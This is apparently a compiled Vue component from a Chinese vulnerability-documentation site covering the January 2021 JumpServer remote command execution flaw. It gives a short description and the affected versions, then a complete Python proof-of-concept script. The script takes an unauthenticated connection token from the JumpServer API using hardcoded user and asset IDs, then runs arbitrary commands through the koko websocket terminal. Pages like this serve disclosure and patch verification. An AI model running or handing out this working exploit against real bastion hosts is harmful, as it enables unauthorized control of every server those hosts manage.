import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as i,a as n,b as s,d as t,e as p}from"./app-58e4a7d6.js";const u={},l=p(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>JumpServer 是全球首款完全开源的堡垒机, 使用GNU GPL v2.0 开源协议, 是符合4A 的专业运维审计系统。 JumpServer 使用Python / Django 进行开发。2021年1月15日，阿里云应急响应中心监控到开源堡垒机JumpServer发布更新，修复了一处远程命令执行漏洞。由于 JumpServer 某些接口未做授权限制，攻击者可构造恶意请求获取敏感信息，或者执行相关操作控制其中所有机器，执行任意命令。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>JumpServer &lt; v2.6.2
JumpServer &lt; v2.5.4
JumpServer &lt; v2.4.5
JumpServer = v1.5.9
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,5),r={href:"https://www.o2oxy.cn/2921.html",target:"_blank",rel:"noopener noreferrer"},k={href:"http://poc.py",target:"_blank",rel:"noopener noreferrer"},d=p(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token comment"># import requests</span>
<span class="token comment"># import json</span>
<span class="token comment"># data={&quot;user&quot;:&quot;4320ce47-e0e0-4b86-adb1-675ca611ea0c&quot;,&quot;asset&quot;:&quot;ccb9c6d7-6221-445e-9fcc-b30c95162825&quot;,&quot;system_user&quot;:&quot;79655e4e-1741-46af-a793-fff394540a52&quot;}</span>
<span class="token comment">#</span>
<span class="token comment"># url_host=&#39;http://192.168.1.73:8080&#39;</span>
<span class="token comment">#</span>
<span class="token comment"># def get_token():</span>
<span class="token comment">#     url = url_host+&#39;/api/v1/users/connection-token/?user-only=1&#39;</span>
<span class="token comment">#     url =url_host+&#39;/api/v1/authentication/connection-token/?user-only=1&#39;</span>
<span class="token comment">#     response = requests.post(url, json=data).json()</span>
<span class="token comment">#     print(response)</span>
<span class="token comment">#     ret=requests.get(url_host+&#39;/api/v1/authentication/connection-token/?token=%s&#39;%response[&#39;token&#39;])</span>
<span class="token comment">#     print(ret.text)</span>
<span class="token comment"># get_token()</span>
<span class="token keyword">import</span> asyncio
<span class="token keyword">import</span> websockets
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> json
url <span class="token operator">=</span> <span class="token string">&quot;/api/v1/authentication/connection-token/?user-only=None&quot;</span>

<span class="token comment"># 向服务器端发送认证后的消息</span>
<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">send_msg</span><span class="token punctuation">(</span>websocket<span class="token punctuation">,</span>_text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> _text <span class="token operator">==</span> <span class="token string">&quot;exit&quot;</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;you have enter &quot;exit&quot;, goodbye&#39;</span></span><span class="token punctuation">)</span>
        <span class="token keyword">await</span> websocket<span class="token punctuation">.</span>close<span class="token punctuation">(</span>reason<span class="token operator">=</span><span class="token string">&quot;user exit&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">await</span> websocket<span class="token punctuation">.</span>send<span class="token punctuation">(</span>_text<span class="token punctuation">)</span>
    recv_text <span class="token operator">=</span> <span class="token keyword">await</span> websocket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>recv_text<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>

<span class="token comment"># 客户端主逻辑</span>
<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">main_logic</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;#######start ws&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">async</span> <span class="token keyword">with</span> websockets<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>target<span class="token punctuation">)</span> <span class="token keyword">as</span> websocket<span class="token punctuation">:</span>
        recv_text <span class="token operator">=</span> <span class="token keyword">await</span> websocket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>recv_text<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
        resws<span class="token operator">=</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>recv_text<span class="token punctuation">)</span>
        <span class="token builtin">id</span> <span class="token operator">=</span> resws<span class="token punctuation">[</span><span class="token string">&#39;id&#39;</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;get ws id:&quot;</span><span class="token operator">+</span><span class="token builtin">id</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;###############&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;init ws&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;###############&quot;</span><span class="token punctuation">)</span>
        inittext <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&quot;id&quot;</span><span class="token punctuation">:</span> <span class="token builtin">id</span><span class="token punctuation">,</span> <span class="token string">&quot;type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;TERMINAL_INIT&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;data&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;{\\&quot;cols\\&quot;:164,\\&quot;rows\\&quot;:17}&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">await</span> send_msg<span class="token punctuation">(</span>websocket<span class="token punctuation">,</span>inittext<span class="token punctuation">)</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            recv_text <span class="token operator">=</span> <span class="token keyword">await</span> websocket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>recv_text<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;###############&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;exec cmd: ls&quot;</span><span class="token punctuation">)</span>
        cmdtext <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&quot;id&quot;</span><span class="token punctuation">:</span> <span class="token builtin">id</span><span class="token punctuation">,</span> <span class="token string">&quot;type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;TERMINAL_DATA&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;data&quot;</span><span class="token punctuation">:</span> cmd<span class="token operator">+</span><span class="token string">&quot;\\r\\n&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>cmdtext<span class="token punctuation">)</span>
        <span class="token keyword">await</span> send_msg<span class="token punctuation">(</span>websocket<span class="token punctuation">,</span> cmdtext<span class="token punctuation">)</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            recv_text <span class="token operator">=</span> <span class="token keyword">await</span> websocket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>recv_text<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;#######finish&#39;</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">import</span> sys
        host<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
        cmd<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> host<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">:</span>
            host<span class="token operator">=</span>host<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;user&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;4320ce47-e0e0-4b86-adb1-675ca611ea0c&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;asset&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;ccb9c6d7-6221-445e-9fcc-b30c95162825&quot;</span><span class="token punctuation">,</span>
                <span class="token string">&quot;system_user&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;79655e4e-1741-46af-a793-fff394540a52&quot;</span><span class="token punctuation">}</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;##################&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;get token url:%s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>host <span class="token operator">+</span> url<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;##################&quot;</span><span class="token punctuation">)</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>host <span class="token operator">+</span> url<span class="token punctuation">,</span> json<span class="token operator">=</span>data<span class="token punctuation">)</span>
        token <span class="token operator">=</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&quot;token&quot;</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;token:%s&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>token<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;##################&quot;</span><span class="token punctuation">)</span>
        target <span class="token operator">=</span> <span class="token string">&quot;ws://&quot;</span> <span class="token operator">+</span> host<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;http://&quot;</span><span class="token punctuation">,</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;/koko/ws/token/?target_id=&quot;</span> <span class="token operator">+</span> token
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;target ws:%s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>target<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        asyncio<span class="token punctuation">.</span>get_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>run_until_complete<span class="token punctuation">(</span>main_logic<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;python jumpserver.py http://192.168.1.73 whoami&quot;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1);function v(m,b){const a=o("ExternalLinkIcon");return c(),i("div",null,[l,n("p",null,[s("详情参考："),n("a",r,[s("https://www.o2oxy.cn/2921.html"),t(a)])]),n("p",null,[n("a",k,[s("poc.py"),t(a)]),s("：")]),d])}const w=e(u,[["render",v],["__file","JumpServer 远程命令执行漏洞.html.vue"]]);export{w as default};
